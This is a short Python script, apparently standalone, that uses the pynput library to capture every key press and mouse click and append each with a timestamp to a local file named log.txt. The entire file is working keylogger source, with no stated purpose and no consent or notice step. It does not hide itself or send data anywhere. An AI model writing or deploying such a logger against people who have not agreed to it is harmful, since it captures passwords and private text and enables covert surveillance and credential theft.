from pynput import keyboard, mouse
from datetime import datetime

LOG_FILE = "log.txt"

def save_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now()}] {data}\n")

def on_key_press(key):
    try:
        save_log(f"Key pressed: {key.char}")
    except AttributeError:
        save_log(f"Special key pressed: {key}")

def on_click(x, y, button, pressed):
    if pressed:
        save_log(f"Mouse clicked at ({x}, {y}) with {button}")

# Start Listeners
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
